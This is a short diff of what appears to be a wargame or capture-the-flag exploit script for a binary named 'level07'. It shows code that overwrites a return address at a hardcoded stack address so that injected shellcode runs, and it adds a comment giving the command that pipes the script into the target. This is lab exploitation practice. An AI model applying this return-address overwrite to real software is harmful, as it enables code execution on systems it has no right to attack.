@@ -42,9 +42,11 @@ for (i, bytes) in enumerate(shellcode):
 
 #     Address of the beginning of the array
 #     |
-#     |                    Index to write at the return value address
-#     |                    |
-#     v                    v
+#     |                          Index to write at the return value address
+#     |                          |
+#     v                          v
 store(int("ffffdc74", 16) + 350, 1073741824 + 114)
 
 p("quit")
+
+# (python /tmp/level07/script.py; cat -) | env -i ./level07
